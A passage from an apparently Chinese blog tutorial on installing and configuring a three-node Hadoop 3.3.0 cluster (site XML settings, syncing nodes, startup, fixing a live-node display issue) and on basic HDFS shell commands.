root@node3:/etc/<br></code></pre></td></tr></table></figure><p>使生效</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">source /etc/profile<br></code></pre></td></tr></table></figure><h1 id="二、开始"><a href="#二、开始" class="headerlink" title="二、开始"></a>二、开始</h1><h2 id="一-、安装配置"><a href="#一-、安装配置" class="headerlink" title="(一)、安装配置"></a>(一)、安装配置</h2><h3 id="1-安装hadoop"><a href="#1-安装hadoop" class="headerlink" title="1. 安装hadoop"></a>1. 安装hadoop</h3><p>复制安装包(本文用的是视频里的安装包)到node1的/export/server/目录下，解压并删除压缩包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">tar -zxvf hadoop-3.3.0-Centos7-64-with-snappy.tar.gz<br>rm -f hadoop-3.3.0-Centos7-64-with-snappy.tar.gz<br></code></pre></td></tr></table></figure><h3 id="2-修改配置文件"><a href="#2-修改配置文件" class="headerlink" title="2. 修改配置文件"></a>2. 修改配置文件</h3><p>配置文件操作都在这个目录下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /export/server/hadoop-3.3.0/etc/hadoop/<br></code></pre></td></tr></table></figure><h4 id="2-1-第1类"><a href="#2-1-第1类" class="headerlink" title="2.1 第1类"></a>2.1 第1类</h4><h5 id="hadoop-env-sh"><a href="#hadoop-env-sh" class="headerlink" title="hadoop-env.sh"></a>hadoop-env.sh</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim hadoop-env.sh<br></code></pre></td></tr></table></figure><p>在文件结尾追加以下并保存</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> JAVA_HOME=/export/server/jdk1.8.0_311<br><span class="hljs-built_in">export</span> HDFS_NAMENODE_USER=root<br><span class="hljs-built_in">export</span> HDFS_DATANODE_USER=root<br><span class="hljs-built_in">export</span> HDFS_SECONDARYNAMENODE_USER=root<br><span class="hljs-built_in">export</span> YARN_RESOURCEMANAGER_USER=root<br><span class="hljs-built_in">export</span> YARN_NODEMANAGER_USER=root <br></code></pre></td></tr></table></figure><h4 id="2-2-第2类"><a href="#2-2-第2类" class="headerlink" title="2.2 第2类"></a>2.2 第2类</h4><h5 id="core-site-xml"><a href="#core-site-xml" class="headerlink" title="core-site.xml"></a>core-site.xml</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim core-site.xml<br></code></pre></td></tr></table></figure><p>在<strong>configuration</strong>标签中间添加以下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 设置默认使用的文件系统 Hadoop支持file、HDFS、GFS、ali|Amazon云等文件系统 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>fs.defaultFS<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>hdfs://node1:8020<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 设置Hadoop本地保存数据路径 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>hadoop.tmp.dir<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>/export/data/hadoop-3.3.0<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 设置HDFS web UI用户身份 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>hadoop.http.staticuser.user<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>root<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 整合hive 用户代理设置 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>hadoop.proxyuser.root.hosts<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>*<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>hadoop.proxyuser.root.groups<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>*<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 文件系统垃圾桶保存时间 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>fs.trash.interval<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>1440<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="hdfs-site-xml"><a href="#hdfs-site-xml" class="headerlink" title="hdfs-site.xml"></a>hdfs-site.xml</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim hdfs-site.xml<br></code></pre></td></tr></table></figure><p>在<strong>configuration</strong>标签中间添加以下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 设置SNN进程运行机器位置信息 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>dfs.namenode.secondary.http-address<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>node2:9868<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="mapred-site-xml"><a href="#mapred-site-xml" class="headerlink" title="mapred-site.xml"></a>mapred-site.xml</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim mapred-site.xml<br></code></pre></td></tr></table></figure><p>在<strong>configuration</strong>标签中间添加以下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 设置MR程序默认运行模式： yarn集群模式 local本地模式 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>mapreduce.framework.name<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>yarn<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- MR程序历史服务地址 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>mapreduce.jobhistory.address<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>node1:10020<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br> <br><span class="hljs-comment">&lt;!-- MR程序历史服务器web端地址 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>mapreduce.jobhistory.webapp.address<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>node1:19888<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>yarn.app.mapreduce.am.env<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>HADOOP_MAPRED_HOME=$&#123;HADOOP_HOME&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>mapreduce.map.env<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>HADOOP_MAPRED_HOME=$&#123;HADOOP_HOME&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>mapreduce.reduce.env<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>HADOOP_MAPRED_HOME=$&#123;HADOOP_HOME&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="yarn-site-xml"><a href="#yarn-site-xml" class="headerlink" title="yarn-site.xml"></a>yarn-site.xml</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim yarn-site.xml<br></code></pre></td></tr></table></figure><p>在<strong>configuration</strong>标签中间添加以下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 设置YARN集群主角色运行机器位置 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>yarn.resourcemanager.hostname<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>node1<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>yarn.nodemanager.aux-services<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>mapreduce_shuffle<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 是否将对容器实施物理内存限制 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>yarn.nodemanager.pmem-check-enabled<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 是否将对容器实施虚拟内存限制。 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>yarn.nodemanager.vmem-check-enabled<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 开启日志聚集 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>yarn.log-aggregation-enable<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 设置yarn历史服务器地址 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>yarn.log.server.url<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>http://node1:19888/jobhistory/logs<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 历史日志保存的时间 7天 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>yarn.log-aggregation.retain-seconds<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>604800<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="2-3-第3类"><a href="#2-3-第3类" class="headerlink" title="2.3 第3类"></a>2.3 第3类</h4><h5 id="workers"><a href="#workers" class="headerlink" title="workers"></a>workers</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim workers<br></code></pre></td></tr></table></figure><p>删除原有，添加以下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">node1<span class="hljs-selector-class">.ifnxs</span><span class="hljs-selector-class">.cn</span><br>node2<span class="hljs-selector-class">.ifnxs</span><span class="hljs-selector-class">.cn</span><br>node3<span class="hljs-selector-class">.ifnxs</span>.cn<br></code></pre></td></tr></table></figure><h3 id="3-修改环境变量"><a href="#3-修改环境变量" class="headerlink" title="3. 修改环境变量"></a>3. 修改环境变量</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/profile<br></code></pre></td></tr></table></figure><p>结尾追加以下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">export HADOOP_HOME=/export/server/hadoop-3.3.0<br>export PATH=$PATH:$HADOOP_HOME/bin:$HADOOP_HOME/sbin<br></code></pre></td></tr></table></figure><h3 id="4-同步到另外两台机器"><a href="#4-同步到另外两台机器" class="headerlink" title="4. 同步到另外两台机器"></a>4. 同步到另外两台机器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /export/server<br>scp -r hadoop-3.3.0 root@node2:$PWD<br>scp -r hadoop-3.3.0 root@node3:$PWD<br>scp /etc/profile root@node2:/etc/<br>scp /etc/profile root@node3:/etc/<br></code></pre></td></tr></table></figure><p>最后在所有机器执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">source /etc/profile<br></code></pre></td></tr></table></figure><h3 id="5-集群启动-node1执行"><a href="#5-集群启动-node1执行" class="headerlink" title="5. 集群启动(node1执行)"></a>5. 集群启动(node1执行)</h3><h4 id="5-1-（-首次启动-）格式化namenode"><a href="#5-1-（-首次启动-）格式化namenode" class="headerlink" title="5.1 （==首次启动==）格式化namenode"></a>5.1 （==首次启动==）格式化namenode</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">hdfs namenode -format<br></code></pre></td></tr></table></figure><h4 id="5-2-脚本一键启动"><a href="#5-2-脚本一键启动" class="headerlink" title="5.2 脚本一键启动"></a>5.2 脚本一键启动</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">start-dfs.sh<br>start-yarn.sh<br></code></pre></td></tr></table></figure><p>日志目录**/export/server/hadoop-3.3.0/logs/**</p><p>启动成功后</p><ul><li><p>node1</p><img src="/2022/01/newpost-28/image-20220105162852233.png" class="" title="image-20220105162852233"></li><li><p>node2</p><img src="/2022/01/newpost-28/image-20220105162910437.png" class="" title="image-20220105162910437"></li><li><p>node3</p><img src="/2022/01/newpost-28/image-20220105162922061.png" class="" title="image-20220105162922061"></li></ul><p>Web  UI页面</p><ul><li>HDFS集群：<a href="http://node1:9870/">http://node1:9870/</a></li><li>YARN集群：<a href="http://node1:8088/">http://node1:8088/</a></li></ul><p>这里我遇到了一个坑，应该是配置本机名那一步，配置完没有重启导致的</p><h5 id="坑："><a href="#坑：" class="headerlink" title="坑："></a>坑：</h5><p><strong>Overview</strong>显示【Live Nodes】有3个，点进去只能看到一个</p><p>经过确认，三台机器的【Cluster ID】一样，可能【Cluster ID】是通过主机名生成的，如果是通过一台虚拟机克隆多台也可能遇到这样的坑，解决方法都是一样的</p><h5 id="解决："><a href="#解决：" class="headerlink" title="解决："></a>解决：</h5><h6 id="1、停止服务（node1）"><a href="#1、停止服务（node1）" class="headerlink" title="1、停止服务（node1）"></a>1、停止服务（node1）</h6><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">stop-dfs.sh<br>stop-yarn.sh<br></code></pre></td></tr></table></figure><h6 id="2、确认三个主机名不一样（三台）"><a href="#2、确认三个主机名不一样（三台）" class="headerlink" title="2、确认三个主机名不一样（三台）"></a>2、确认三个主机名不一样（三台）</h6><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cat</span> /etc/hostname<br></code></pre></td></tr></table></figure><h6 id="3、删除data（三台）"><a href="#3、删除data（三台）" class="headerlink" title="3、删除data（三台）"></a>3、删除data（三台）</h6><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">rm</span> -rf /export/data/hadoop-3.3.0/<br></code></pre></td></tr></table></figure><h6 id="4、重启机器（三台）"><a href="#4、重启机器（三台）" class="headerlink" title="4、重启机器（三台）"></a>4、重启机器（三台）</h6><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">reboot<br></code></pre></td></tr></table></figure><h6 id="5、初始化（node1）"><a href="#5、初始化（node1）" class="headerlink" title="5、初始化（node1）"></a>5、初始化（node1）</h6><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">hdfs namenode -format<br></code></pre></td></tr></table></figure><h6 id="6、启动（node1）"><a href="#6、启动（node1）" class="headerlink" title="6、启动（node1）"></a>6、启动（node1）</h6><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">start-dfs.sh<br>start-yarn.sh<br></code></pre></td></tr></table></figure><img src="/2022/01/newpost-28/image-20220105162039073.png" class="" title="image-20220105162039073"><h2 id="二-、使用"><a href="#二-、使用" class="headerlink" title="(二)、使用"></a>(二)、使用</h2><h3 id="MapReduce体验"><a href="#MapReduce体验" class="headerlink" title="MapReduce体验"></a>MapReduce体验</h3><p>计算圆周率</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /export/server/hadoop-3.3.0/share/hadoop/mapreduce/<br>hadoop jar hadoop-mapreduce-examples-3.3.0.jar pi 2 2<br></code></pre></td></tr></table></figure><h3 id="HDFS常用命令"><a href="#HDFS常用命令" class="headerlink" title="HDFS常用命令"></a>HDFS常用命令</h3><h4 id="1-创建文件夹"><a href="#1-创建文件夹" class="headerlink" title="1. 创建文件夹"></a>1. 创建文件夹</h4><p>**hadoop fs -mkdir [-p] &#60;path&#62;  … **</p><p>path 为待创建的目录</p><p>-p选项的行为与Unix mkdir -p非常相似，它会沿着路径创建父目录</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">hadoop fs -<span class="hljs-built_in">mkdir</span> /ifnxs<br></code></pre></td></tr></table></figure><h4 id="2-查看指定目录下内容"><a href="#2-查看指定目录下内容" class="headerlink" title="2. 查看指定目录下内容"></a>2. 查看指定目录下内容</h4><p><strong>hadoop fs -ls [-h] [-R] [&#60;path&#62; …]</strong></p><p>path 指定目录路径</p><p>-h 人性化显示文件size</p><p>-R 递归查看指定目录及其子目录</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">hadoop fs -<span class="hljs-built_in">ls</span> -h /<br></code></pre></td></tr></table></figure><h4 id="3-上传文件到HDFS指定目录下"><a href="#3-上传文件到HDFS指定目录下" class="headerlink" title="3. 上传文件到HDFS指定目录下"></a>3. 上传文件到HDFS指定目录下</h4><p><strong>hadoop fs -put [-f] [-p]  &#60;localsrc&#62; … &#60;dst&#62;</strong></p><p>-f 覆盖目标文件（已存在下）</p><p>-p 保留访问和修改时间，所有权和权限</p><p>localsrc 本地文件系统（客户端所在机器）</p><p>dst 目标文件系统（HDFS）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> 1 &gt; 1.txt<br>hadoop fs -put 1.txt /ifnxs<br></code></pre></td></tr></table></figure><h4 id="4-查看HDFS文件内容"><a href="#4-查看HDFS文件内容" class="headerlink" title="4. 查看HDFS文件内容"></a>4. 查看HDFS文件内容</h4><p><strong>hadoop fs -cat  &#60;src&#62;  …</strong></p><p>读取指定文件全部内容，显示在标准输出控制台</p><p>注意：对于大文件内容读取，慎重</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">hadoop fs -<span class="hljs-built_in">cat</span> /ifnxs/1.txt<br></code></pre></td></tr></table></figure><h4 id="5-下载HDFS文件"><a href="#5-下载HDFS文件" class="headerlink" title="5. 下载HDFS文件"></a>5. 下载HDFS文件</h4><p><strong>hadoop fs -get [-f] [-p]   &#60;src&#62; … &#60;localdst&#62;</strong></p><p>下载文件到本地文件系统指定目录，localdst必须是目录</p><p>-f 覆盖目标文件（已存在下）</p><p>-p 保留访问和修改时间，所有权和权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">hadoop fs -get /ifnxs/1.txt ./2.txt<br></code></pre></td></tr></table></figure><h4 id="6-拷贝HDFS文件"><a href="#6-拷贝HDFS文件" class="headerlink" title="6. 拷贝HDFS文件"></a>6. 拷贝HDFS文件</h4><p>**hadoop fs -cp [-f] &#60;src&#62; … &#60;dst&#62; **</p><p>-f 覆盖目标文件（已存在下）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">hadoop fs -<span class="hljs-built_in">cp</span> /ifnxs/1.txt /ifnxs/3.txt<br></code></pre></td></tr></table></figure><h4 id="7-追加数据到HDFS文件中"><a href="#7-追加数据到HDFS文件中" class="headerlink" title="7. 追加数据到HDFS文件中"></a>7. 追加数据到HDFS文件中</h4><p><strong>hadoop fs -appendToFile  &#60;localsrc&#62; … &#60;dst&#62;</strong></p><p>将所有给定本地文件的内容追加到给定dst文件</p><p>dst如果文件不存在，将创建该文件</p><p>如果&#60;localSrc&#62;为-，则输入为从标准输入中读取</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">hadoop fs -appendToFile 1.txt 2.txt /ifnxs/1.txt<br></code></pre></td></tr></table></figure><h4 id="8-HDFS数据移动操作"><a href="#8-HDFS数据移动操作" class="headerlink" title="8. HDFS数据移动操作"></a>8. HDFS数据移动操作</h4><p>**hadoop fs -mv &#60;src&#62; … &#60;dst&#62; **</p><p>移动文件到指定文件夹下</p><p>可以使用该命令移动数据，重命名文件的名称</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code 